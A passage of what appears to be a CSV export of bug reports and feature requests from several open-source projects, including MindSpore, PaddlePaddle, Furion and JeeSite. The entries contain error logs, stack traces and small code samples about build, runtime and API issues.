org.springframework.beans.factory.annotation.AutowiredAnnotationBeanPostProcessor$AutowiredFieldElement.inject(AutowiredAnnotationBeanPostProcessor.java:640) ~[spring-beans-5.2.8.RELEASE.jar:5.2.8.RELEASE] ... 20 common frames omitted
为 chain节点增加描述属性（discribe），以便于书写中文注释,"当前的xml配置 name是唯一标识chain 的key，我提议在上添加describe属性，以便于添加一些中文描述，该属性用于方便人阅读，解析时可忽略。 添加前： 添加后：   <code>: &lt;?xml version=""1.0"" encoding=""UTF-8""?&gt; &lt;flow&gt; &lt;nodes&gt; &lt;node id=""s1"" type=""script""&gt; 你的脚本代码 &lt;/node&gt; &lt;/nodes&gt; &lt;chain name=""chain1""&gt; THEN(a, b, c); &lt;/chain&gt; &lt;/flow&gt; &lt;?xml version=""1.0"" encoding=""UTF-8""?&gt; &lt;flow&gt; &lt;nodes&gt; &lt;node id=""s1"" type=""script""&gt; 你的脚本代码 &lt;/node&gt; &lt;/nodes&gt; &lt;chain name=""chain1"" describe=""用于对信用卡的业务进行检查""&gt; THEN(a, b, c); &lt;/chain&gt; &lt;/flow&gt;"
remove unused C   class OpRegistrar,"These two class, and , are very confusing. I find that class is not used anymore. So, just remove it.   <code>: OperatorRegistrar OpRegistrar OpRegistrar"
表格树怎么设置多选框级联选择,"如题，怎么设置选中父级时，子级一起选中，目前使用官网中的表格树示例加上多选框后不能级联选中 示例代码：   <code>: &lt;!DOCTYPE html&gt; &lt;html class=""no-js""&gt; &lt;head&gt; &lt;meta charset=""utf-8""/&gt; &lt;meta http-equiv=""X-UA-Compatible"" content=""IE=edge""/&gt; &lt;title&gt;测试&lt;/title&gt; &lt;meta name=""description"" content=""""/&gt; &lt;meta name=""viewport"" content=""width=device-width, initial-scale=1""/&gt; &lt;script src=""https://cdn.staticfile.org/axios/0.19.0-beta.1/axios.js""&gt;&lt;/script&gt; &lt;script src=""https://cdn.staticfile.org/vue/2.5.17/vue.js""&gt;&lt;/script&gt; &lt;script src=""https://unpkg.com/element-ui/lib/index.js""&gt;&lt;/script&gt; &lt;script src=""https://cdn.jsdelivr.net/npm/@smallwei/avue/lib/avue.min.js""&gt;&lt;/script&gt; &lt;link rel=""stylesheet"" href=""https://cdn.jsdelivr.net/npm/@smallwei/avue/lib/index.css""/&gt; &lt;link rel=""stylesheet"" href=""https://unpkg.com/element-ui/lib/theme-chalk/index.css""/&gt; &lt;/head&gt; &lt;body&gt; &lt;div id=""app""&gt; &lt;avue-crud v-model=""form"" :option=""option"" :data=""data"" ref=""crud"" @row-save=""rowSave"" @row-update=""rowUpdate"" @row-del=""rowDel""&gt; &lt;template slot=""icon"" slot-scope=""scope""&gt; &lt;i :class=""scope.row.icon"" style=""font-size:24px""&gt;&lt;/i&gt; &lt;/template&gt; &lt;template slot=""menu"" slot-scope=""{row,size,type}""&gt; &lt;el-button :size=""size"" :type=""type"" @click=""handleAdd(row)""&gt;新增子级&lt;/el-button&gt; &lt;/template&gt; &lt;/avue-crud&gt; &lt;/div&gt; &lt;/body&gt; &lt;script&gt; new Vue({ el: ""#app"", data(){ return { parentId:undefined, form:{}, data: [ { id: 10, event: '事件1', timeLine: 50, comment: '无' }, { id: 1, event: '事件1', timeLine: 100, comment: '无', children: [ { parentId:1, id: 2, event: '事件2', timeLine: 10, comment: '无' }, { parentId:1, id: 3, event: '事件3', timeLine: 90, comment: '无', children: [ { parentId:3, id: 4, event: '事件4', timeLine: 5, comment: '无' }, { parentId:3, id: 5, event: '事件5', timeLine: 10, comment: '无' } ] } ] } ], option: { headerAlign: 'center', align: 'center', border: true, index: true, rowKey:'id', rowParentKey:'parentId', selection: true, // defaultExpandAll:true, column: [ { label: '事件', prop: 'event', align: 'left', width: 200 }, { label: '时间线', prop: 'timeLine' }, { label: '备注', prop: 'comment' } ], } } }, methods:{ rowDel(row,index,done){ done(row) }, rowSave(row,done){ row.parentId=this.parentId; row.id=new Date().getTime() this.parentId=undefined; done(row) }, rowUpdate(row,index,done){ done(row) }, handleAdd(row){ this.parentId=row.id this.$refs.crud.rowAdd() } } }); &lt;/script&gt; &lt;/html&gt;"
Add a missing API NormalizePad and correct a redundant API HorizontalFlip,"Task Use this template for task tracking kind/task Task Description There is a missing API which can not be shown on the website. And there are two in the API docs, one of which should be . Task Goal The APIs in show correctly. Sub Task No. Task Description Issue ID 1 2   <code>: NormalizePad HorizontalFlip VerticalFlip mindspore.dataset.version"
请问是否支持 integer_value_sub_sub_sequence 呢？就是三级嵌套的id输入？,": 背景 在doc下，需要输入每个句子中的每个词上的每个char,如下： 因此，如果直观处理，就需要 类似这样的东西 似乎是没有这样的，请问是否有什么hack吗……   <code>: [ # doc [ # =&gt; sentence level [ # =&gt; word level [ # =&gt; character level char1, char2, ... ] ] ] ] integer_value_sub_sub_sequence"
Paddle SparseRowCpuMatrix::addTo SIGSEGV when width of matrix cannot be divided by 32.,"The log message shows below. The buggy code is here. This bug because method uses plain instruct, the input buffer must be aligned by 32. If matrix dimension cannot be divided by 32. It will cause SIGSEGV. The possible fixes could be.   <code>: [WARNING 2017-02-17 17:31:41,513 layers.py:1252] NOTE: the gru memory layer's size is set by previous input layer, and should be input size / 3. Set size explicitly will be ignored. [INFO 2017-02-17 17:31:41,516 networks.py:1466] The input order is [bidword_seq, label] [INFO 2017-02-17 17:31:41,516 networks.py:1472] The output order is [__cost_0__] I0217 17:31:41.518110 26649 Trainer.cpp:125] ignore sparse_remote_update=true due to --local=true I0217 17:31:41.518137 26649 Trainer.cpp:173] trainer mode: SgdSparseCpuTraining I0217 17:31:55.190280 26649 PyDataProvider2.cpp:243] loading dataprovider dataprovider::process [INFO 2017-02-17 17:31:56,881 dataprovider.py:20] dict len : 1972305 I0217 17:31:56.881968 26649 PyDataProvider2.cpp:243] loading dataprovider dataprovider::process [INFO 2017-02-17 17:31:58,100 dataprovider.py:20] dict len : 1972305 I0217 17:31:58.100997 26649 GradientMachine.cpp:135] Initing parameters.. I0217 17:32:31.008913 26649 GradientMachine.cpp:142] Init parameters done. I0217 17:32:32.164254 3860 ThreadLocal.cpp:40] thread use undeterministic rand seed:3861 *** Aborted at 1487323962 (unix time) try ""date -d @1487323962"" if you are using GNU date *** PC: @ 0x798110 paddle::simd::internal::addToImpl() *** SIGSEGV (@0x0) received by PID 26649 (TID 0x7f41619ea700) from PID 0; stack trace: *** @ 0x7f46ad8be160 (unknown) @ 0x798110 paddle::simd::internal::addToImpl() @ 0x78c9ed paddle::SparseRowCpuMatrix::addTo() @ 0x70b117 paddle::TrainerThread::mergeGradSparse() @ 0x70b58b paddle::TrainerThread::mergeCpuGradients() @ 0x70bda7 paddle::TrainerThread::backward() @ 0x70c02d paddle::TrainerThread::computeThread() @ 0x7f46acbd28a0 execute_native_thread_routine @ 0x7f46ad8b61c3 start_thread @ 0x7f46ac34312d __clone /home/work/yangyaming/programs/paddle_internal_release_tools/idl/paddle/output/bin/paddle_local: line 109: 26649 Segmentation fault ${DEBUGGER} $MYDIR/../opt/paddle/bin/paddle_trainer ${@:2} simd:: addTo _mm256_load_ps dest = dest.rowBuf(id) local = getLocalRow(i) while dest % 32 !=0: *dest += *local ++dest ++local simd::addTo(dest, local, this-&gt;width_);"
[CT][MS][GPU-LuUnpack] operator Can not select a valid kernel on Ascend,"众智gpu算子在ascend平台执行报错，用例报找不到valid kernel / 硬件环境: /device ascend/GPU/CPU/kirin/等其他芯片 : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative /mode graph test_p_luunpack_7d_int16_uint8、test_p_luunpack_7d_int16_int32、test_p_luunpack_5d_int32_int16、test_p_luunpack_3d_float64_int32、test_p_luunpack_2d_float64_int64 动态rank用例：test_dynamic_rank_luunpack_3d_int16_int32(仅pynative，图模式报core dumped) def test_p_luunpack_3d_float64_int32(): A = torch.tensor(np.random.randn(2, 3, 5).astype(np.float64)) a_lu, pivots = A.lu() a_lu = Tensor(a_lu.numpy().astype(np.float64)) pivots = Tensor(pivots.numpy().astype(np.int32)) fact = LuUnpackMock(inputs=[a_lu, pivots]) fact.forward_cmp() operations/test_luunpack.py:82: share/ops/primitive/luunpack_ops.py:104: in grad_cmp input_grad_mindspore = self.grad_mindspore_impl() share/ops/primitive/luunpack_ops.py:78: in grad_mindspore_impl input_grad = grad_net(self.lu_data, self.pivots, output_grad_tensor) /root/archiconda3/envs/sjx_high/lib/python3.7/site-packages/mindspore/nn/cell.py:627: in call out = self.compile_and_run(*args) /root/archiconda3/envs/sjx_high/lib/python3.7/site-packages/mindspore/nn/cell.py:943: in compile_and_run self.compile(*inputs) /root/archiconda3/envs/sjx_high/lib/python3.7/site-packages/mindspore/nn/cell.py:917: in compile jit_config_dict=self._jit_config_dict) self = &lt;mindspore.common.api._CellGraphExecutor object at 0xffff88749850&gt;, obj = GradOfAllInputs&lt; (network): LuUnpackNet&lt;&gt; , phase = 'train.1669876761418489600.281471291033168.1' do_convert = True, jit_config_dict = {} args = (Tensor(shape=[2, 3, 5], dtype=Float64, value= [[[ 1.55556182e+00, -1.27818758e+00, 1.29487249e+00, -5.19299239e-01, ...280e+00, -1.73748225e+00], [-2.45009614e-01, 4.51015486e-01, -1.02140186e+00, 2.38357841e+00, -3.95589279e-01]]]))) E TypeError: Can not select a valid kernel info for [Add] in AI CORE or AI CPU kernel info candidates list. E E ---------------------------------------------------- E - Kernel Info Candidates List: E ---------------------------------------------------- E E AI CORE: E (&lt;Float32xFRACTAL_NZ&gt;, &lt;Float32xFRACTAL_NZ&gt;) -&gt; (&lt;Float32xFRACTAL_NZ&gt;) E (, ) -&gt; () E (&lt;Float16xFRACTAL_NZ&gt;, &lt;Float16xFRACTAL_NZ&gt;) -&gt; (&lt;Float16xFRACTAL_NZ&gt;) E (, ) -&gt; () E (&lt;Int32xFRACTAL_NZ&gt;, &lt;Int32xFRACTAL_NZ&gt;) -&gt; (&lt;Int32xFRACTAL_NZ&gt;) E (, ) -&gt; () E (&lt;Int8xFRACTAL_NZ&gt;, &lt;Int8xFRACTAL_NZ&gt;) -&gt; (&lt;Int8xFRACTAL_NZ&gt;) E (, ) -&gt; () E (&lt;UInt8xFRACTAL_NZ&gt;, &lt;UInt8xFRACTAL_NZ&gt;) -&gt; (&lt;UInt8xFRACTAL_NZ&gt;) E (, ) -&gt; () E AI CPU: E {} E Please check the given data type or shape: E AI CORE: : (&lt;Tensor[Float64], (2, 3, 5)&gt;, &lt;Tensor[Float64], (2, 3, 5)&gt;) -&gt; (&lt;Tensor[Float64], (2, 3, 5)&gt;) E AI CPU: : (&lt;Tensor[Float64], (2, 3, 5)&gt;, &lt;Tensor[Float64], (2, 3, 5)&gt;) -&gt; (&lt;Tensor[Float64], (2, 3, 5)&gt;) E For more details, please refer to 'Kernel Select Failed' at https://www.mindspore.cn E E ---------------------------------------------------- E - The Function Call Stack: (For framework developers) E ---------------------------------------------------- E In file /root/archiconda3/envs/sjx_high/lib/python3.7/site-packages/mindspore/ops/_grad_experimental/grad_math_ops.py:217/ lu_data_grad = dl + du/ E Corresponding forward node candidate: E - In file /home/sjx/MindSporeTest_new/share/ops/primitive/luunpack_ops.py:22/ return self.lu_unpack(lu_data, lu_pivots)/ E In file /home/sjx/MindSporeTest_new/share/grad.py:20/ return self.grad(self.network, self.params)(*inputs)/ E E ---------------------------------------------------- E - C++ Call Stack: (For framework developers) E ---------------------------------------------------- E mindspore/ccsrc/plugin/device/ascend/hal/hardware/ascend_graph_optimization.cc:398 SetOperatorInfo 2. 3. pass   <code>: fact.grad_cmp() def compile(self, obj, *args, phase='predict', do_convert=True, jit_config_dict=None): """""" Compiles graph. Args: obj (Function/Cell): The function or cell instance need compile. args (tuple): Function or cell input arguments. phase (str): The name of compile phase. Default: 'predict'. do_convert (bool): When set to True, convert ME graph to GE graph after compiling graph. jit_config_dict (dict): Jit config for compile. Default: None. Return: Str, the full phase of the cell. Bool, if the graph has been compiled before, return False, else return True. """""" obj.__parse_method__ = 'construct' if not hasattr(obj, obj.__parse_method__): raise AttributeError( 'The class {} dose not have method {}'.format(obj.__class__.__name__, obj.__parse_method__)) args_list = args self.enable_tuple_broaden = False if hasattr(obj, ""enable_tuple_broaden""): self.enable_tuple_broaden = obj.enable_tuple_broaden self._graph_executor.set_enable_tuple_broaden(self.enable_tuple_broaden) key = self._graph_executor.generate_arguments_key(obj, args_list, self.enable_tuple_broaden) obj.arguments_key = str(key) phase = phase + '.' + str(obj.create_time) + '.' + str(id(obj)) + '.' + obj.arguments_key if phase in obj.compile_cache and self.has_compiled(phase): logger.debug(""%r graph has existed."", phase) return phase, False obj.check_names() _check_full_batch() self._set_dataset_mode(args_list) self._set_compile_cache_dep_files(phase) enable_ge = context.get_context(""enable_ge"") self._graph_executor.set_weights_values(obj.parameters_dict()) if jit_config_dict: self._graph_executor.set_jit_config(jit_config_dict) result = self._graph_executor.compile(obj, args_list, phase, self._use_vm_mode())"
项目编译成jar/war后 mybatis的mapper找不到类文件,问题1 直接通过jar运行方式出现找不到类的情况 问题2: 我通过Tomcat方式启动成功了 但是 在打包的文件中 common模块 也被打包jar了 在jar中包含static静态文件 这静态文件直接通过也URL访问的时候 404 在web-inf的lib文件夹中 确实存在 common.jar模块 静态也就也存在   <code>: 05-30 11:51:22.594 ERROR [com.jeesite.common.mybatis.SqlSessionFactoryBean] - Failed to parse mappin : 'URL [jar:file:/D:/project/jeesite-web.jar!/WEB-INF/lib/jeesite-framework-4.0-SNAPSHOT.jar!/map les/sys/MenuDao.xml]' org.apache.ibatis.builder.BuilderException: Error parsing Mapper XML. Cause: org.apache.ibatis.build Exception: Error resolving class. Cause: org.apache.ibatis.type.TypeException: Could not resolve typ enu'. Cause: java.lang.ClassNotFoundException: Cannot find class: Menu at org.apache.ibatis.builder.xml.XMLMapperBuilder.configurationElement(XMLMapperBuilder.java at org.apache.ibatis.builder.xml.XMLMapperBuilder.parse(XMLMapperBuilder.java:92) at com.jeesite.common.mybatis.SqlSessionFactoryBean.buildSqlSessionFactory(nk:414) at com.jeesite.common.mybatis.SqlSessionFactoryBean.afterPropertiesSet(nk:272) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.invokeInitMe ractAutowireCapableBeanFactory.java:1687)
增加 BootstrapBlazorOptions 全局配置类,增加 BootstrapBlazorOptions 全局配置类 通过配置类统一设置组件统一行为如 组件统一设置全站 属性为 3000 毫秒   <code>: Toast Delay
[ST][MS][NET][pangu/wide&deep/bert][910 32p]RuntimeError: Init hccl graph adapter failed,"pangu/wide&amp;deep/bert/resnet50/yolov3等网络在910环境多机训练失败 / 硬件环境: /device ascend : -- MindSpore version :r1.8.0 B030 commit_id:83905777 -- Python version : -- OS platform and distribution : -- GCC/Compiler version : ok版本： run包:HiAI/HISI_C82/20220609 MindSpore 版本：编译时间20220614211828 r1.8.0-B020 commit_id:ac72a96de9e 失败版本： run包:HiAI/HISI_C82/20220616 MindSpore 版本：编译时间20220623222559 r1.8.0-B030 commit_id:83905777 (/): /mode graph test_ms_pangu_alpha_ascend_train_32p_0001.py test_ms_pangu_alpha_pipeline_ascend_train_32p_0001.py test_ms_pangu_moe_alltoall_train_check_loss_910_32p_0001.py test_ms_pangu_moe_pipline_alltoall_train_check_loss_910_32p_0001.py cd solution_test/remaining/test_scripts/mindspore/net/pangu_alpha/network python -m nose -s --nologcapture test_ms_pangu_alpha_ascend_train_32p_0001.py 网络训练成功 走个周峰   <code>: [ERROR] HCCP(69053,python):2022-06-24-10:22:01.430.367 [ra_hdc.c:1305]tid:69053,ra_hdc_rdev_init(1305) : [init][ra_hdc_rdev]ra hdc message process failed ret(-2) phy_id(0) [ERROR] HCCP(69053,python):2022-06-24-10:22:01.430.413 [ra_host.c:520]tid:69053,ra_rdev_init(520) : [init][ra_rdev]ra rdev init failed, ret(-2) [ERROR] HCCL(69053,python):2022-06-24-10:22:01.430.443 [adapter_hccp.cc:332][hccl-69053-0-1656066120-hccl_world_group][0][Init][RaRdma]errNo[0x0000000005000013] rdma init fail. params: mode[1]. return: ret[228000], *rdmaHandle[(nil)] [ERROR] HCCL(69053,python):2022-06-24-10:22:01.430.458 [network_manager.cc:348][hccl-69053-0-1656066120-hccl_world_group][0][Init][DeviceRDMA]errNo[0x000000000500000b] ra rdma init failed, devid[0] ip[0x6564bcb1], return[19] [ERROR] HCCL(69053,python):2022-06-24-10:22:01.430.470 [network_manager.cc:272][hccl-69053-0-1656066120-hccl_world_group][0][Start][Nic]errNo[0x0000000005000013] ra nic init rdma failed, devid[0], return[11] [ERROR] HCCL(69053,python):2022-06-24-10:22:01.430.481 [hccl_impl_base.cc:759][hccl-69053-0-1656066120-hccl_world_group][0][Init][Nic]strt nic ipaddr[6564bcb1] failed [ERROR] HCCL(69053,python):2022-06-24-10:22:01.430.490 [hccl_impl_base.cc:243][hccl-69053-0-1656066120-hccl_world_group][0]call trace: ret -&gt; 19 [ERROR] HCCL(69053,python):2022-06-24-10:22:01.430.499 [hccl_impl.cc:704][hccl-69053-0-1656066120-hccl_world_group][0]call trace: ret -&gt; 19 [ERROR] HCCL(69053,python):2022-06-24-10:22:01.430.509 [hccl_comm.cc:99][hccl-69053-0-1656066120-hccl_world_group][0][HcclComm][Init]errNo[0x0000000005000013] hccl initialize failed [ERROR] HCCL(69053,python):2022-06-24-10:22:01.430.520 [hcom.cc:80][hccl-69053-0-1656066120-hccl_world_group][0][Init][Result]errNo[0x0000000005010013] hcclComm init error [ERROR] HCCL(69053,python):2022-06-24-10:22:01.430.532 [hcom.cc:94][hccl-69053-0-1656066120-hccl_world_group][0][Init][Result]hcom init failed, rankNum[32], rank[0], server[10.90.66.63], device[0], return[83951635] [TRACE] HCCL(69053,python):2022-06-24-10:22:01.696.636 [status:stop] [hcom.cc:270][hccl-69053-0-1656066120-hccl_world_group][0]hcom destroy complete,take time [266092]us, rankNum[32], rank[0] [ERROR] HCCL(69053,python):2022-06-24-10:22:01.696.661 [hcom.cc:188][hccl-69053-0-1656066120-hccl_world_group][0][HcomInitByFile]errNo[0x0000000005000013] rankTablePath[/home/jenkins/workspace/TDT_deployment/config/hccl.json] identify[0] hcom init failed. [ERROR] HCCL(69053,python):2022-06-24-10:22:01.696.679 [hcom_plugin.cc:205][hccl-69053-0-1656066120-hccl_world_group][0][Init][HcomPlugin]errNo[0x0000000005010013] Initialize: HcomInitByFile failed. [ERROR] HCCL(69053,python):2022-06-24-10:22:01.696.692 [hcom_plugin.cc:62][hccl-69053-0-1656066120-hccl_world_group][0][Initialize][Plugin]Initialize Hcom failed [CRITICAL] HCCL_ADPT(69053,ffffb227d480,python):2022-06-24-10:22:01.696.728 [mindspore/ccsrc/plugin/device/ascend/hal/hccl_adapter/hccl_adapter.cc:405] InitKernelInfoStore] Init hccl graph adapter failed. project_root: /home/jenkins/workspace/TDT_deployment/solution_test/remaining/test_scripts/mindspore/net/pangu_alpha/network [ERROR] TDT(69053,python):2022-06-24-10:22:01.824.952 [log.cpp:38]tsd client wait response fail, device response code[1]. unknown device error.,[process_mode_manager.cpp:228:WaitRsp]69053 [ERROR] TDT(69053,python):2022-06-24-10:22:01.825.016 [log.cpp:38]Wait open response from device failed.,[process_mode_manager.cpp:166:Close]69053 [ERROR] TDT(69053,python):2022-06-24-10:22:01.825.029 [log.cpp:38]TsdClose failed, deviceId[0].,[tsd_client.cpp:60:TsdClose]69053 [ERROR] RUNTIME(69053,python):2022-06-24-10:22:01.825.072 [runtime.cc:1613]69053 stopAicpuExecutor:report error module_type=0, module_name=E39999 [ERROR] RUNTIME(69053,python):2022-06-24-10:22:01.825.083 [runtime.cc:1613]69053 stopAicpuExecutor:TsdClose failed. devId=0, tdt error=31 Traceback (most recent call last): File ""/home/jenkins/workspace/TDT_deployment/solution_test/remaining/test_scripts/mindspore/net/pangu_alpha/network/test_ms_pangu_alpha_ascend_train_32p_0001/train.py"", line 525, in &lt;module&gt; run_train(opt) File ""/home/jenkins/workspace/TDT_deployment/solution_test/remaining/test_scripts/mindspore/net/pangu_alpha/network/test_ms_pangu_alpha_ascend_train_32p_0001/train.py"", line 132, in run_train rank, device_num = set_parallel_context(args_opt) File ""/home/jenkins/workspace/TDT_deployment/solution_test/remaining/test_scripts/mindspore/net/pangu_alpha/network/test_ms_pangu_alpha_ascend_train_32p_0001/train.py"", line 97, in set_parallel_context D.init() File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/communication/management.py"", line 143, in init init_hccl() RuntimeError: Init hccl graph adapter failed. ---------------------------------------------------- - C++ Call Stack: (For framework developers) ---------------------------------------------------- mindspore/ccsrc/plugin/device/ascend/hal/hccl_adapter/hccl_adapter.cc:405 InitKernelInfoStore [ERROR] HCCP(69053,python):2022-06-24-10:22:03.928.587 [ra_hdc.c:97]tid:69053,hdc_send_recv_pkt_send(97) : [send][hdc_send_recv_pkt]HDC send err ret(25) [ERROR] HCCP(69053,python):2022-06-24-10:22:03.928.643 [ra_hdc.c:184]tid:69053,hdc_send_recv_pkt(184) : [send_recv][pkt]HDC pkt send err ret(25) phy_id(0) [ERROR] HCCP(69053,python):2022-06-24-10:22:03.928.654 [ra_hdc.c:263]tid:69053,ra_hdc_process_msg(263) : [process][ra_hdc_msg]hdc_send_recv_pkt failed ret(25) phy_id(0) [ERROR] HCCP(69053,python):2022-06-24-10:22:03.928.665 [ra_hdc.c:1269]tid:69053,ra_hdc_socket_deinit(1269) : [deinit][ra_hdc_socket]ra hdc message process failed ret(25） phy_id(0) [ERROR] HCCP(69053,python):2022-06-24-10:22:03.928.676 [ra_host.c:392]tid:69053,ra_socket_deinit(392) : [deinit][ra_socket]ra socket deinit failed, ret(25) [ERROR] HCCL(69053,python):2022-06-24-10:22:03.928.706 [adapter_hccp.cc:361][hccl-69053-0-1656066120-hccl_world_group][0][DeInit][RaSocket]errNo[0x0000000005000013] rt socket deinit fail. return[328007], socketHandle[0xaaab25a7d260]. [ERROR] HCCL(69053,python):2022-06-24-10:22:03.928.720 [network_manager.cc:670][hccl-69053-0-1656066120-hccl_world_group][0][Stop][NicsSocket]NIC socket deInit not successfully [ERROR] HCCL(69053,python):2022-06-24-10:22:03.928.732 [network_manager.cc:329][hccl-69053-0-1656066120-hccl_world_group][0][Stop][AllDeviceNicSockets]errNo[0x000000000500000b] stop nic socket failed,devid[0],ip[6564bcb1]，return[19] [ERROR] HCCP(69053,python):2022-06-24-10:22:03.928.753 [ra_hdc.c:97]tid:69053,hdc_send_recv_pkt_send(97) : [send][hdc_send_recv_pkt]HDC send err ret(25) [ERROR] HCCP(69053,python):2022-06-24-10:22:03.928.762 [ra_hdc.c:184]tid:69053,hdc_send_recv_pkt(184) : [send_recv][pkt]HDC pkt send err ret(25) phy_id(0) [ERROR] HCCP(69053,python):2022-06-24-10:22:03.928.770 [ra_hdc.c:263]tid:69053,ra_hdc_process_msg(263) : [process][ra_hdc_msg]hdc_send_recv_pkt failed ret(25) phy_id(0) [ERROR] HCCP(69053,python):2022-06-24-10:22:03.928.779 [ra_hdc.c:390]tid:69053,ra_hdc_socket_listen_stop(390) : [listen_stop][ra_hdc_socket]ra hdc message process failed ret(25) phy_id(0). [ERROR] HCCL(69053,python):2022-06-24-10:22:03.928.793 [adapter_hccp.cc:410][hccl-69053-0-1656066120-hccl_world_group][0][ListenStop][RaSocket]errNo[0x000000000500000b] ra socket listen stop fail. return[328207], params: conn[0xfffffccdb320], num[1] [ERROR] HCCP(69053,python):2022-06-24-10:22:03.928.823 [ra_hdc.c:97]tid:69053,hdc_send_recv_pkt_send(97) : [send][hdc_send_recv_pkt]HDC send err ret(25) [ERROR] HCCP(69053,python):2022-06-24-10:22:03.928.832 [ra_hdc.c:184]tid:69053,hdc_send_recv_pkt(184) : [send_recv][pkt]HDC pkt send err ret(25) phy_id(0) [ERROR] HCCP(69053,python):2022-06-24-10:22:03.928.840 [ra_hdc.c:263]tid:69053,ra_hdc_process_msg(263) : [process][ra_hdc_msg]hdc_send_recv_pkt failed ret(25) phy_id(0) [ERROR] HCCP(69053,python):2022-06-24-10:22:03.928.849 [ra_hdc.c:1269]tid:69053,ra_hdc_socket_deinit(1269) : [deinit][ra_hdc_socket]ra hdc message process failed ret(25） phy_id(0) [ERROR] HCCP(69053,python):2022-06-24-10:22:03.928.857 [ra_host.c:392]tid:69053,ra_socket_deinit(392) : [deinit][ra_socket]ra socket deinit failed, ret(25) [ERROR] HCCL(69053,python):2022-06-24-10:22:03.928.870 [adapter_hccp.cc:361][hccl-69053-0-1656066120-hccl_world_group][0][DeInit][RaSocket]errNo[0x0000000005000013] rt socket deinit fail. return[328007], socketHandle[0xaaab25ab8e30]. [ERROR] HCCP(69053,python):2022-06-24-10:22:03.928.883 [ra_hdc.c:97]tid:69053,hdc_send_recv_pkt_send(97) : [send][hdc_send_recv_pkt]HDC send err ret(25) [ERROR] HCCP(69053,python):2022-06-24-10:22:03.928.891 [ra_hdc.c:184]tid:69053,hdc_send_recv_pkt(184) : [send_recv][pkt]HDC pkt send err ret(25) phy_id(0) [ERROR] HCCP(69053,python):2022-06-24-10:22:03.928.899 [ra_hdc.c:263]tid:69053,ra_hdc_process_msg(263) : [process][ra_hdc_msg]hdc_send_recv_pkt failed ret(25) phy_id(0) [ERROR] HCCP(69053,python):2022-06-24-10:22:03.928.907 [ra_hdc.c:1126]tid:69053,ra_hdc_session_close(1126) : [close][ra_hdc_session]ra hdc message process failed ret(25) phy_id(0) [ERROR] HCCP(69053,python):2022-06-24-10:22:03.928.916 [ra_hdc.c:1143]tid:69053,ra_hdc_deinit(1143) : [deinit][ra_hdc]close hdc session failed, ret(25) phy_id(0) [ERROR] HCCP(69053,python):2022-06-24-10:22:03.928.938 [ra_hdc.c:1167]tid:69053,ra_hdc_deinit(1167) : [deinit][ra_hdc]hdc deinit fail! phy_id(0) [ERROR] HCCP(69053,python):2022-06-24-10:22:03.928.947 [ra_host.c:286]tid:69053,ra_deinit(286) : [deinit][ra]ra hdc deinit failed, ret(25) [ERROR] HCCL(69053,python):2022-06-24-10:22:03.928.959 [adapter_hccp.cc:319][hccl-69053-0-1656066120-hccl_world_group][0][DeInit][Ra]errNo[0x0000000005000013] ra deinit fail. return[328007], params: config[0xfffffccdb5c0] [ERROR] HCCL(69053,python):2022-06-24-10:22:03.928.969 [network_manager.cc:618][hccl-69053-0-1656066120-hccl_world_group][0]ra deinit failed. para: nicdeploy[1], phy_id[0]"
[建议]  “Fur.Database.Migrations“  迁移类库名称可以自定义,迁移类库名称可以自定义；https://gitee.com/monksoul/Fur/blob/main/framework/Fur/DatabaseAccessor/Extensions/DatabaseProvider/DatabaseProviderServiceCollectionExtensions.cs#L245   <code>: Fur.Database.Migrations
IHttpDispatchProxy能不能支持动态域名，将域名当作参数传入,"Furion 版本号 4.4.6 .NET SDK 版本号 .NET5 .NET6 .NET7 Web 项目类型 WebApi Mvc Razor Pages Blazor Server MinApp 操作系统和版本 Windows Linux MacOS 其他 代码环境 开发环境（Development） 生产环境（Production） 测试环境 IHttpDispatchProxy能不能支持动态域名，类似下面这个写法，将域名当作参数传入   <code>: [Get(""{domain}/api/ApiLogin/Login?UserName={userName}&amp;Password={pwd}"", ContentType = ""application/x-www-form-urlencoded"")] Task&lt;GetTokenResult&gt; GetToken(string domain,string userName,string pwd); 看文档里面只有模板配置，可以实现，但是我这个域名是要从数据库查询出来的，不是固定的配置文件"
验证码无法正常显示,"pig版本:2019 v2.2.0 操作系统:window10 是否修改包名: 否 项目按照部署完成,进行访问 验证码无法正常显示 访问地址：http://localhost:8080/#/login 访问结果： 已经ok啦 pig-gateway 的host配置的有问题 谢谢大佬   <code>: Proxy error: Could not proxy request /code?randomStr=50081560147508557 from localhost:8080 to http://pig-gateway:9999 (ENOTFOUND)."
[ST][MS][NET][ppo][cpu/gpu/910]Too many WARNING log,"网络训练告警日志太多，请优化告警日志 包含网络：tinybert、resnet50、ppo、dqn、lstm、cyclegan、deeplabv3、textcnn、ssd、densenet100 / 硬件环境: /device 910、GPU、CPU : -- MindSpore version :r2.0 commit_id:3942f0a0 -- Python version : -- OS platform and distribution : -- GCC/Compiler version : run包:HiAI/HISI_C83/20221010 MindSpore 版本：编译时间202210191215492 r2.0 commit_id:3942f0a0 (/): /mode graph test_ppo_train_infer_200_episode_gpu_cpu_1p_0001.py cd solution_test/cases/02network/05rl/ppo/train pytest -s test_ppo_train_infer_200_episode_gpu_cpu_1p_0001.py 网络训练成功，告警日志正常 走给唐慧康   <code>: [WARNING] RUNTIME_FRAMEWORK(28625,ffff5e7fc0f0,python):2022-10-20-02:56:11.829.855 [mindspore/ccsrc/runtime/device/device_address.h:195] GetOffloadPtr] Not implemented. [WARNING] RUNTIME_FRAMEWORK(28625,ffff5e7fc0f0,python):2022-10-20-02:56:11.829.872 [mindspore/ccsrc/runtime/device/device_address.h:191] SetOffloadPtr] Not implemented."
Execution timeout occurs occasionally on TeamCity.,"Sometimes, it seems all the unit tests have passed, but execution timeout error occurs on TeamCity. For example: https://paddleci.ngrok.io/viewLog.html?buildId=32147&amp;buildTypeId=Paddle_PrCi&amp;tab=buildLog   <code>: [12:28:28] [Step 1/1] 213/216 Test #205: test_machine_translation ........................ Passed 23.09 sec [12:28:38] [Step 1/1] 214/216 Test #216: test_memopt_machine_translation ................. Passed 12.52 sec [12:29:21] [Step 1/1] 215/216 Test #182: test_all_ops .................................... Passed 163.50 sec [13:30:12] [Step 1/1] The build Paddle::PR_CI #13866 {buildId=32147} has been running for more than 90 minutes. Terminating... [13:30:12] [Step 1/1] Execution timeout [13:30:13] [Step 1/1] Dumping threads before termination: [13:30:13] [Step 1/1] PID: 17727, PPID: 5657, Command line: /bin/bash /home/baidu/BuildAgent/temp/agentTmp/custom_script990793524437287743 [13:30:13] [Step 1/1] Failed to locate jps tool. No thread dump information is available 